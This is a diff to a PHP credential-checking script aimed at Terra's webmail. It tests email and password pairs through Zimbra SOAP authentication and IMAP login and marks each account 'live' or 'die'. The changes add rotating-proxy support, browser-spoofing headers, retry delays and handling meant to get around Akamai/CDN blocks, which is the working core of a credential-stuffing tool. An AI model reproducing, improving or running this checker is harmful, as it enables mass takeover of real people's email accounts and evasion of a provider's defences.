@@ -3,14 +3,6 @@ define('CRLF', chr(13) . chr(10));
 define('LF', chr(10));
 define('DQ', chr(34));
 
-if (!defined('CURLOPT_PROXY')) define('CURLOPT_PROXY', 10004);
-if (!defined('CURLOPT_PROXYUSERPWD')) define('CURLOPT_PROXYUSERPWD', 10006);
-if (!defined('CURLOPT_PROXYTYPE')) define('CURLOPT_PROXYTYPE', 101);
-if (!defined('CURLOPT_HTTPPROXYTUNNEL')) define('CURLOPT_HTTPPROXYTUNNEL', 61);
-if (!defined('CURLPROXY_HTTP')) define('CURLPROXY_HTTP', 0);
-if (!defined('CURLPROXY_SOCKS5')) define('CURLPROXY_SOCKS5', 5);
-if (!defined('CURLPROXY_SOCKS5_HOSTNAME')) define('CURLPROXY_SOCKS5_HOSTNAME', 7);
-
 while (ob_get_level() > 0) { @ob_end_clean(); }
 ob_start();
 
@@ -60,8 +52,9 @@ if ($action === 'diag_check') {
     $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
     $diag = array('email' => $email, 'methods' => array());
 
-    $diag['methods']['socket_direct'] = diagSocketDirect($email, $password, 20);
-    $diag['methods']['curl_direct'] = diagCurlDirect($email, $password, 20);
+    $diag['methods']['zimbra_soap_direct'] = diagZimbraSoap($email, $password, 20, '');
+    $diag['methods']['zimbra_soap_proxy'] = !empty($proxy) ? diagZimbraSoap($email, $password, 20, $proxy) : null;
+    $diag['methods']['socket_imap'] = diagSocketImap($email, $password, 15);
 
     ob_end_clean();
     echo json_encode($diag, JSON_PRETTY_PRINT);
@@ -108,17 +101,10 @@ function parseProxy($proxy) {
     return array('host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass, 'type' => $type);
 }
 
-function testProxy($proxy) {
-    if (!extension_loaded('curl')) return false;
+function applyProxyToCurl($ch, $proxy) {
+    if (empty($proxy)) return;
     $p = parseProxy($proxy);
-    if (empty($p['host'])) return false;
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    if (empty($p['host'])) return;
     curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
     if ($p['type'] === 'socks5') {
         curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
@@ -129,39 +115,115 @@ function testProxy($proxy) {
     if (!empty($p['user'])) {
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
     }
+}
+
+function testProxy($proxy) {
+    if (!extension_loaded('curl')) return false;
+    $p = parseProxy($proxy);
+    if (empty($p['host'])) return false;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    applyProxyToCurl($ch, $proxy);
     $result = curl_exec($ch);
     curl_close($ch);
     return ($result !== false && strlen(trim($result)) > 0);
 }
 
-function doValidate($email, $password, $proxy) {
-    $timeout = 20;
-    $delays = array(0, 2000000, 4000000, 7000000, 10000000);
+function buildSoapAuthRequest($email, $password) {
+    $safe_email = htmlspecialchars($email, ENT_XML1);
+    $safe_pass = htmlspecialchars($password, ENT_XML1);
+    return '<?xml version="1.0" encoding="UTF-8"?>' .
+        '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">' .
+        '<soap:Body>' .
+        '<AuthRequest xmlns="urn:zimbraAccount">' .
+        '<account by="name">' . $safe_email . '</account>' .
+        '<password>' . $safe_pass . '</password>' .
+        '</AuthRequest>' .
+        '</soap:Body>' .
+        '</soap:Envelope>';
+}
 
-    for ($attempt = 0; $attempt < 5; $attempt++) {
-        if ($delays[$attempt] > 0) usleep($delays[$attempt]);
+function parseZimbraResponse($result, $code, $email) {
+    if ($result === false) return null;
+    $lower = strtolower($result);
 
-        // METODO 1: Socket IMAP direto (MAIS CONFIÁVEL)
-        $r = trySocketDirect($email, $password, $timeout);
-        if ($r !== null) return $r;
+    // Akamai/CDN block = nao e resposta do Zimbra
+    if ($code === 403 || $code === 401) return null;
+    if (strpos($lower, '<html') !== false || strpos($lower, 'access denied') !== false) return null;
+    if (strpos($lower, 'akamai') !== false) return null;
 
-        // METODO 2: Zimbra SOAP direto (sem proxy, porta 443)
-        if (extension_loaded('curl')) {
-            $r = tryZimbraSoapDirect($email, $password, $timeout);
-            if ($r !== null) return $r;
+    // authToken = LOGIN BEM-SUCEDIDO
+    if (strpos($lower, 'authtoken') !== false && strpos($lower, 'soap:fault') === false) {
+        return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
+    }
+
+    // SOAP fault = erro do servidor Zimbra
+    if (strpos($lower, 'soap:fault') !== false || strpos($lower, 'faultcode') !== false) {
+        // Erros de autenticacao = credencial invalida
+        if (strpos($lower, 'authfailed') !== false ||
+            strpos($lower, 'invalid password') !== false ||
+            strpos($lower, 'account not found') !== false ||
+            strpos($lower, 'authentication failed') !== false ||
+            strpos($lower, 'auth failed') !== false ||
+            strpos($lower, 'invalid account') !== false ||
+            strpos($lower, 'no such account') !== false) {
+            return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
         }
+        // Outros faults = erro do servidor, nao da credencial
+        return null;
+    }
 
-        // METODO 3: cURL IMAP direto (fallback)
-        if (extension_loaded('curl')) {
-            $r = tryCurlDirect($email, $password, $timeout);
-            if ($r !== null) return $r;
+    // 200 sem fault nem authToken = resposta inesperada
+    if ($code === 200) {
+        // Se tem algum conteudo XML valido mas sem authToken
+        if (strpos($lower, '<?xml') !== false || strpos($lower, 'soap:') !== false) {
+            return null;
         }
     }
 
-    return array('status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true);
+    return null;
 }
 
-function trySocketDirect($email, $password, $timeout) {
+function tryZimbraSoap($email, $password, $timeout, $proxy) {
+    if (!extension_loaded('curl')) return null;
+
+    $soapXml = buildSoapAuthRequest($email, $password);
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/service/soap/');
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $soapXml);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
+    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        'Content-Type: application/soap+xml; charset=utf-8',
+        'Accept: application/soap+xml, text/xml, */*',
+        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Origin: https://mail.terra.com.br',
+        'Referer: https://mail.terra.com.br/',
+    ));
+    if (!empty($proxy)) applyProxyToCurl($ch, $proxy);
+
+    $result = curl_exec($ch);
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    return parseZimbraResponse($result, $code, $email);
+}
+
+function trySocketImap($email, $password, $timeout) {
     $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
     if ($socket === false) return null;
     stream_set_timeout($socket, $timeout);
@@ -199,16 +261,38 @@ function trySocketDirect($email, $password, $timeout) {
     return null;
 }
 
-function tryZimbraSoapDirect($email, $password, $timeout) {
-    $soapXml = '<?xml version="1.0" encoding="UTF-8"?>' .
-        '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">' .
-        '<soap:Body>' .
-        '<AuthRequest xmlns="urn:zimbraAccount">' .
-        '<account by="name">' . htmlspecialchars($email, ENT_XML1) . '</account>' .
-        '<password>' . htmlspecialchars($password, ENT_XML1) . '</password>' .
-        '</AuthRequest>' .
-        '</soap:Body>' .
-        '</soap:Envelope>';
+function doValidate($email, $password, $proxy) {
+    $timeout = 20;
+    $delays = array(0, 2000000, 4000000, 7000000, 10000000);
+
+    for ($attempt = 0; $attempt < 5; $attempt++) {
+        if ($delays[$attempt] > 0) usleep($delays[$attempt]);
+
+        // METODO 1: Zimbra SOAP direto do Render (porta 443)
+        if (extension_loaded('curl')) {
+            $r = tryZimbraSoap($email, $password, $timeout, '');
+            if ($r !== null) return $r;
+        }
+
+        // METODO 2: Zimbra SOAP via proxy (porta 443, IP rotativo)
+        if (!empty($proxy) && extension_loaded('curl')) {
+            $r = tryZimbraSoap($email, $password, $timeout, $proxy);
+            if ($r !== null) return $r;
+        }
+
+        // METODO 3: IMAP direto (porta 993 — pode voltar a funcionar)
+        $r = trySocketImap($email, $password, $timeout);
+        if ($r !== null) return $r;
+    }
+
+    return array('status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true);
+}
+
+function diagZimbraSoap($email, $password, $timeout, $proxy) {
+    if (!extension_loaded('curl')) return array('ok' => false, 'err' => 'no curl');
+
+    $soapXml = buildSoapAuthRequest($email, $password);
+    $label = empty($proxy) ? 'direct' : 'proxy';
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/service/soap/');
@@ -228,112 +312,32 @@ function tryZimbraSoapDirect($email, $password, $timeout) {
         'Content-Type: application/soap+xml; charset=utf-8',
         'Accept: application/soap+xml, text/xml, */*',
     ));
+    if (!empty($proxy)) applyProxyToCurl($ch, $proxy);
 
+    $t0 = microtime(true);
     $result = curl_exec($ch);
     $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-
-    if ($result === false) return null;
-    $lower = strtolower($result);
-
-    if ($code === 403 || $code === 401) return null;
-    if (strpos($lower, '<html') !== false || strpos($lower, 'access denied') !== false) return null;
-
-    if (strpos($lower, 'authtoken') !== false && strpos($lower, 'soap:fault') === false) {
-        return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
-    }
-    if (strpos($lower, 'soap:fault') !== false) {
-        if (strpos($lower, 'auth') !== false || strpos($lower, 'password') !== false || strpos($lower, 'account') !== false) {
-            return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
-        }
-    }
-    return null;
-}
-
-function tryCurlDirect($email, $password, $timeout) {
-    if (!extension_loaded('curl')) return null;
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
-    curl_setopt($ch, CURLOPT_USERNAME, $email);
-    curl_setopt($ch, CURLOPT_PASSWORD, $password);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
-    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
-    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
-    $result = curl_exec($ch);
+    $err = curl_error($ch);
     $errno = curl_errno($ch);
     curl_close($ch);
-    if ($errno === 67) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
-    if ($result !== false) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
-    return null;
+    $timeMs = round((microtime(true) - $t0) * 1000);
+
+    return array(
+        'ok' => $result !== false,
+        'http_code' => $code,
+        'time_ms' => $timeMs,
+        'err' => $err,
+        'errno' => $errno,
+        'response' => $result !== false ? substr($result, 0, 500) : null,
+    );
 }
 
-function diagSocketDirect($email, $password, $timeout) {
+function diagSocketImap($email, $password, $timeout) {
     $t0 = microtime(true);
     $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
     if ($socket === false) {
         return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => sprintf('%s (%d)', $errstr, $errno));
     }
-    stream_set_timeout($socket, $timeout);
-    $greeting = '';
-    $dl = microtime(true) + $timeout;
-    while (!feof($socket) && microtime(true) < $dl) {
-        $line = @fgets($socket, 8192);
-        if ($line === false) { usleep(50000); continue; }
-        $greeting .= $line;
-        if (strpos($line, LF) !== false) break;
-    }
-    if (stripos($greeting, 'OK') === false) {
-        fclose($socket);
-        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'No greeting', 'greeting' => substr($greeting, 0, 300));
-    }
-
-    $safe_email = str_replace(array(chr(92), chr(34)), array(chr(92) . chr(92), chr(92) . chr(34)), $email);
-    $safe_pass = str_replace(array(chr(92), chr(34)), array(chr(92) . chr(92), chr(92) . chr(34)), $password);
-    $cmd = 'A1 LOGIN ' . DQ . $safe_email . DQ . ' ' . DQ . $safe_pass . DQ . CRLF;
-    fwrite($socket, $cmd);
-
-    $response = '';
-    $dl2 = microtime(true) + $timeout;
-    while (!feof($socket)) {
-        $line = @fgets($socket, 8192);
-        if ($line === false) { usleep(50000); continue; }
-        $response .= $line;
-        if (strpos(trim($line), 'A1 ') === 0) break;
-        if (microtime(true) > $dl2) break;
-    }
-    @fwrite($socket, 'A2 LOGOUT' . CRLF);
     fclose($socket);
-    $timeMs = round((microtime(true) - $t0) * 1000);
-
-    if (preg_match('/A1\s+OK/i', $response)) return array('ok' => true, 'status' => 'live', 'time_ms' => $timeMs, 'response' => substr($response, 0, 300));
-    if (preg_match('/A1\s+NO/i', $response)) return array('ok' => true, 'status' => 'die', 'time_ms' => $timeMs, 'response' => substr($response, 0, 300));
-    if (preg_match('/A1\s+BAD/i', $response)) return array('ok' => true, 'status' => 'die', 'time_ms' => $timeMs, 'response' => substr($response, 0, 300));
-    return array('ok' => false, 'time_ms' => $timeMs, 'err' => 'No A1 response', 'response' => substr($response, 0, 300));
-}
-
-function diagCurlDirect($email, $password, $timeout) {
-    if (!extension_loaded('curl')) return array('ok' => false, 'err' => 'no curl');
-    $t0 = microtime(true);
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
-    curl_setopt($ch, CURLOPT_USERNAME, $email);
-    curl_setopt($ch, CURLOPT_PASSWORD, $password);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
-    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
-    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
-    $result = curl_exec($ch);
-    $errno = curl_errno($ch);
-    $err = curl_error($ch);
-    curl_close($ch);
-    $timeMs = round((microtime(true) - $t0) * 1000);
-
-    if ($errno === 67) return array('ok' => true, 'status' => 'die', 'errno' => 67, 'time_ms' => $timeMs, 'err' => $err);
-    if ($result !== false) return array('ok' => true, 'status' => 'live', 'time_ms' => $timeMs, 'result_len' => strlen($result));
-    return array('ok' => false, 'errno' => $errno, 'time_ms' => $timeMs, 'err' => $err);
+    return array('ok' => true, 'time_ms' => round((microtime(true) - $t0) * 1000));
 }
